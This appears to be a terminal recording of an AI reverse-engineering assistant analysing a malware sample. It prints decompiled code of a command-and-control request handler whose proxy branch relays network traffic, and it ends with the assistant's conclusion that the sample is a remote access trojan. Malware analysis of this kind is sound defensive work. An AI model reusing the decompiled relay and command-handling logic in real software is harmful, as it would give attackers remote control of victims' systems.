[106.06331, "o", "Value(&reply_7);\\\\\\\\n    }\\\\\\\\n    else {\\\\\\\\n      bVar4 = std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"proxy\\\\\\\\\\\\\\\");\\\\\\\\n      if (bVar4) {\\\\\\\\n        Json::Value::Value(&reply_8,nullValue);\\\\\\\\n                    /* try { // try from 0041cb86 to 0041cbfa has its CatchHandler @ 0041d2cb */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Reverse-Port\\\\\\\\\\\\\\\");\\\\\\\\n        rev_port = Json::Value::asUInt(pVVar10);\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Dest-Port\\\\\\\\\\\\\\\");\\\\\\\\n        des_port = Json::Value::asUInt(pVVar10);\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Dest-Host\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::asString((Value *)&des_host);\\\\\\\\n"]
[106.063435, "o", "                    /* try { // try from 0041cc07 to 0041cc0b has its CatchHandler @ 0041d28e */\\\\\\\\n        Json::Value::Value(&local_c8,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041cc18 to 0041cc2b has its CatchHandler @ 0041cc3a */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_8,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_c8);\\\\\\\\n                    /* try { // try from 0041cc33 to 0041cc37 has its CatchHandler @ 0041d28e */\\\\\\\\n        Json::Value::~Value(&local_c8);\\\\\\\\n                    /* try { // try from 0041cc6c to 0041cc70 has its CatchHandler @ 0041d28e */\\\\\\\\n        Json::Value::Value(&local_a8,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041cc7d to 0041cc90 has its CatchHandler @ 0041cc9f */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_8,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_a8);\\\\\\\\n                    /* try { // try from 0041cc98 to 0041cc9"]
[106.063509, "o", "c has its CatchHandler @ 0041d28e */\\\\\\\\n        Json::Value::~Value(&local_a8);\\\\\\\\n                    /* try { // try from 0041ccce to 0041ccd2 has its CatchHandler @ 0041d28e */\\\\\\\\n        Json::Value::Value(&local_88,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041ccdf to 0041ccef has its CatchHandler @ 0041ccfb */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_8,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_88);\\\\\\\\n                    /* try { // try from 0041ccf4 to 0041ccf8 has its CatchHandler @ 0041d28e */\\\\\\\\n        Json::Value::~Value(&local_88);\\\\\\\\n                    /* try { // try from 0041cd2c to 0041cd52 has its CatchHandler @ 0041d28e */\\\\\\\\n        bVar4 = WriteJson(this,&reply_8);\\\\\\\\n        if (bVar4) {\\\\\\\\n          ClientConnection::ClientConnection(&client);\\\\\\\\n                    /* try { // try from 0041cd5a to 0041cd5e has its CatchHandler @ 0041d26b */\\\\\\\\n          ClientConnection::ClientConnection(&server);\\\\"]
[106.063594, "o", "\\\\n                    /* try { // try from 0041cd66 to 0041d20a has its CatchHandler @ 0041d22e */\\\\\\\\n          Connection::Create((Connection *)&client);\\\\\\\\n          Connection::setNonblock((Connection *)&client,true);\\\\\\\\n          uVar3 = des_port;\\\\\\\\n          pcVar12 = (char *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::\\\\\\\\n                            c_str((basic_string<char,std::char_traits<char>,std::allocator<char>> *)\\\\\\\\n                                  &des_host);\\\\\\\\n          ClientConnection::Connect(&client,pcVar12,uVar3);\\\\\\\\n          Connection::Create((Connection *)&server);\\\\\\\\n          Connection::setNonblock((Connection *)&server,true);\\\\\\\\n          uVar3 = rev_port;\\\\\\\\n          pcVar12 = (char *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::\\\\\\\\n                            c_str((basic_string<char,std::char_traits<char>,std::allocator<char>> *)\\\\\\\\n                                  &this->connected_host);\\\\\\\\n          ClientCo"]
[106.063699, "o", "nnection::Connect(&server,pcVar12,uVar3);\\\\\\\\n          iVar7 = Connection::GetSock((Connection *)&client);\\\\\\\\n          iVar9 = Connection::GetSock((Connection *)&server);\\\\\\\\n          if (iVar9 < iVar7) {\\\\\\\\n            iStack_10a78 = Connection::GetSock((Connection *)&client);\\\\\\\\n          }\\\\\\\\n          else {\\\\\\\\n            iStack_10a78 = Connection::GetSock((Connection *)&server);\\\\\\\\n          }\\\\\\\\n          maxfd = iStack_10a78;\\\\\\\\n          nevents = 0;\\\\\\\\n          tv.tv_sec = 1;\\\\\\\\n          tv.tv_usec = 0;\\\\\\\\n          do {\\\\\\\\n            __arr = (anon_struct_conflict4 *)&attr;\\\\\\\\n            for (__i = 0; __i < 0x10; __i = __i + 1) {\\\\\\\\n              *(undefined8 *)((long)__arr + (ulong)__i * 8) = 0;\\\\\\\\n            }\\\\\\\\n            iVar7 = Connection::GetSock((Connection *)&client);\\\\\\\\n            uVar1 = *(ulong *)((long)&attr + ((ulong)(long)iVar7 >> 6) * 8);\\\\\\\\n            iVar9 = Connection::GetSock((Connection *)&client);\\\\\\\\n            *(ulong *)((long)&attr + ((ulong)(lo"]
[106.06381, "o", "ng)iVar7 >> 6) * 8) =\\\\\\\\n                 1L << ((byte)iVar9 & 0x3f) | uVar1;\\\\\\\\n            iVar7 = Connection::GetSock((Connection *)&server);\\\\\\\\n            uVar1 = *(ulong *)((long)&attr + ((ulong)(long)iVar7 >> 6) * 8);\\\\\\\\n            iVar9 = Connection::GetSock((Connection *)&server);\\\\\\\\n            *(ulong *)((long)&attr + ((ulong)(long)iVar7 >> 6) * 8) =\\\\\\\\n                 1L << ((byte)iVar9 & 0x3f) | uVar1;\\\\\\\\n            __arr_1 = &exceptfds;\\\\\\\\n            for (__i_1 = 0; __i_1 < 0x10; __i_1 = __i_1 + 1) {\\\\\\\\n              __arr_1->fds_bits[__i_1] = 0;\\\\\\\\n            }\\\\\\\\n            iVar7 = Connection::GetSock((Connection *)&client);\\\\\\\\n            uVar1 = exceptfds.fds_bits[(ulong)(long)iVar7 >> 6];\\\\\\\\n            iVar9 = Connection::GetSock((Connection *)&client);\\\\\\\\n            exceptfds.fds_bits[(ulong)(long)iVar7 >> 6] = 1L << ((byte)iVar9 & 0x3f) | uVar1;\\\\\\\\n            iVar7 = Connection::GetSock((Connection *)&server);\\\\\\\\n            uVar1 = exceptfds.fds_bits[(ulong)(long"]
[106.063898, "o", ")iVar7 >> 6];\\\\\\\\n            iVar9 = Connection::GetSock((Connection *)&server);\\\\\\\\n            exceptfds.fds_bits[(ulong)(long)iVar7 >> 6] = 1L << ((byte)iVar9 & 0x3f) | uVar1;\\\\\\\\n            __readfds = &attr;\\\\\\\\n            nevents = select(maxfd + 1,(fd_set *)__readfds,(fd_set *)0x0,(fd_set *)&exceptfds,\\\\\\\\n                             (timeval *)&tv);\\\\\\\\n            for (i = 0; i < nevents; i = i + 1) {\\\\\\\\n              iVar7 = Connection::GetSock((Connection *)&client);\\\\\\\\n              lVar2 = exceptfds.fds_bits[(ulong)(long)iVar7 >> 6];\\\\\\\\n              iVar7 = Connection::GetSock((Connection *)&client);\\\\\\\\n              if ((lVar2 >> ((byte)iVar7 & 0x3f) & 1U) == 0) {\\\\\\\\n                iVar7 = Connection::GetSock((Connection *)&server);\\\\\\\\n                lVar2 = exceptfds.fds_bits[(ulong)(long)iVar7 >> 6];\\\\\\\\n                iVar7 = Connection::GetSock((Connection *)&server);\\\\\\\\n                if ((lVar2 >> ((byte)iVar7 & 0x3f) & 1U) != 0) goto LAB_0041d0dc;\\\\\\\\n                bVar4"]
[106.063919, "o", " = false;\\\\\\\\n              }\\\\\\\\n              else {\\\\\\\\nLAB_0041d0dc:\\\\\\\\n                bVar4 = true;\\\\\\\\n              }\\\\\\\\n              iVar7 = (int)__readfds;\\\\\\\\n              if (bVar4) {\\\\\\\\nLAB_0041d251:\\\\\\\\n                uStack_10af4 = 1;\\\\\\\\n                    /* try { // try from 0041d258 to 0041d25c has its CatchHandler @ 0041d26b */\\\\\\\\n                ClientConnection::~ClientConnection(&server,iVar7);\\\\\\\\n                    /* try { // try from 0041d264 to 0041d268 has its CatchHandler @ 0041d28e */\\\\\\\\n                ClientConnection::~ClientConnection(&client,iVar7);\\\\\\\\n                goto LAB_0041d2b1;\\\\\\\\n              }\\\\\\\\n              iVar7 = Connection::GetSock((Connection *)&client);\\\\\\\\n              lVar2 = *(long *)((long)&attr + ((ulong)(long)iVar7 >> 6) * 8);\\\\\\\\n              iVar7 = Connection::GetSock((Connection *)&client);\\\\\\\\n              if ((lVar2 >> ((byte)iVar7 & 0x3f) & 1U) != 0) {\\\\\\\\n                pcVar12 = buffer;\\\\\\\\n                n = Connection::"]
[106.064006, "o", "Read((Connection *)&client,pcVar12,0xffff);\\\\\\\\n                iVar7 = (int)pcVar12;\\\\\\\\n                if (n < 1) goto LAB_0041d251;\\\\\\\\n                __readfds = (anon_union *)buffer;\\\\\\\\n                Connection::Write((Connection *)&server,__readfds->__size,n);\\\\\\\\n              }\\\\\\\\n              iVar7 = Connection::GetSock((Connection *)&server);\\\\\\\\n              lVar2 = *(long *)((long)&attr + ((ulong)(long)iVar7 >> 6) * 8);\\\\\\\\n              iVar7 = Connection::GetSock((Connection *)&server);\\\\\\\\n              if ((lVar2 >> ((byte)iVar7 & 0x3f) & 1U) != 0) {\\\\\\\\n                pcVar12 = buffer;\\\\\\\\n                n_1 = Connection::Read((Connection *)&server,pcVar12,0xffff);\\\\\\\\n                iVar7 = (int)pcVar12;\\\\\\\\n                if (n_1 < 1) goto LAB_0041d251;\\\\\\\\n                __readfds = (anon_union *)buffer;\\\\\\\\n                Connection::Write((Connection *)&client,__readfds->__size,n_1);\\\\\\\\n              }\\\\\\\\n            }\\\\\\\\n          } while( true );\\\\\\\\n        }\\\\\\\\n    "]
[106.064139, "o", "    uStack_10af4 = 0;\\\\\\\\nLAB_0041d2b1:\\\\\\\\n                    /* try { // try from 0041d2b8 to 0041d2bc has its CatchHandler @ 0041d2cb */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&des_host);\\\\\\\\n                    /* try { // try from 0041d2c4 to 0041d2c8 has its CatchHandler @ 0041d2fa */\\\\\\\\n        Json::Value::~Value(&reply_8);\\\\\\\\n      }\\\\\\\\n      else {\\\\\\\\n        uStack_10af4 = 0;\\\\\\\\n      }\\\\\\\\n    }\\\\\\\\n  }\\\\\\\\nLAB_0041d327:\\\\\\\\n  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&type);\\\\\\\\n  return (bool)uStack_10af4;\\\\\\\\n}\\\\\\\\n\\\\\\\\n\\\\\\\"\\\"\", \"metadata\": {\"function_name\": \"HandleRequest\", \"function_start_address\": \"0041a91c\", \"function_end_address\": \"0041d342\", \"function_signature\": \"bool __thiscall HandleRequest(Value * request)\", \"inbou"]
[106.064209, "o", "nd_calls\": [\"TriggerTask\"], \"outbound_calls\": [\"Command\", \"Create\", \"operator=\", \"Connect\", \"GetFileData\", \"Read\", \"WriteBlock\", \"ExecuteCMD\", \"pthread_attr_init\", \"~allocator\", \"size\", \"operator.new\", \"pthread_create\", \"basic_string\", \"~Value\", \"asString\", \"pthread_attr_setdetachstate\", \"Value\", \"NewUploadFile\", \"asCString\", \"ClientConnection\", \"operator=\", \"operator[]\", \"FileOpration\", \"Value\", \"setNonblock\", \"c_str\", \"operator==<char,_std::char_traits<char>,_std::allocator<char>_>\", \"Value\", \"allocator\", \"isString\", \"SetWriteCipher\", \"WorkerThread\", \"select\", \"WriteBody\", \"RemoveFile\", \"ExecuteScriptCMD\", \"asInt\", \"basic_string\", \"GetSock\", \"basic_string\", \"pthread_attr_destroy\", \"WriteJson\", \"operator[]\", \"~ClientConnection\", \"InputScript\", \"remove\", \"ShowFileList\", \"handle\", \"File2CopyOrMove\", \"Value\", \"Write\", \"~basic_string\", \"asUInt\", \"Worker\", \"htonl\", \"length\"], \"is_external\": false, \"document_type\": \"decompiled_function\"}}\r\n\u001b[0m"]
[130.834152, "o", "\u001b[1;3;38;5;200mThought: The decompiled content of the `HandleRequest` function is extensive and indicates that this function is responsible for handling various types of requests, potentially from a command and control server. It includes logic for handling commands such as \"connection\", \"command\", \"script\", \"download\", \"upload\", \"filelist\", \"remove\", \"move\", \"copy\", and \"proxy\". This suggests a wide range of capabilities that the malware can perform, which are typical for a remote access trojan (RAT) or similar type of malware.\r\n\r\nThe function `ExecuteCMD` is called within the context of handling a \"command\" type request, which confirms that the malware can execute arbitrary system commands received from an external controller. Additionally, there are references to file operations and proxy functionality, indicating that the malware can manipulate files and redirect network traffic.\r\n\r\nGiven the complexity of the `HandleRequest` function and the various capabilities it handles, it is clear that this function"]
[130.834389, "o", " is central to the malware's operation and likely interacts with the command and control server to receive instructions and perform actions on the infected system.\r\nResponse: The malware has a wide range of capabilities, as evidenced by the `HandleRequest` function. It can handle commands to execute system commands, manipulate files, and proxy network traffic, among other actions. The `ExecuteCMD` function within `HandleRequest` is specifically used to execute system commands, which is a clear indication of the malware's ability to perform remote command execution. The presence of these capabilities suggests that the malware is likely a remote access trojan or similar type of malware with extensive control over the infected system.\r\n\u001b[0m"]
[130.8346, "o", "The malware has a wide range of capabilities, as evidenced by the `HandleRequest` function. It can handle commands to execute system commands, manipulate files, and proxy network traffic, among other actions. The `ExecuteCMD` function within `HandleRequest` is specifically used to execute system commands, which is a clear indication of the malware's ability to perform remote command execution. The presence of these capabilities suggests that the malware is likely a remote access trojan or similar type of malware with extensive control over the infected system.\r\n"]
[130.834631, "o", "> "]
[148.604233, "o", "^C"]
[148.604433, "o", "Finished!\r\n"]
[148.910139, "o", "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                                                                                                                                                                          \r \r"]
[148.910274, "o", "\r\u001b[0m\u001b[27m\u001b[24m\u001b[Jkaida@kaidas-MacBook-Pro reverse-engineering-assistant % \u001b[K\u001b[?2004h"]
[150.443652, "o", "\u001b[?2004l\r\r\n"]
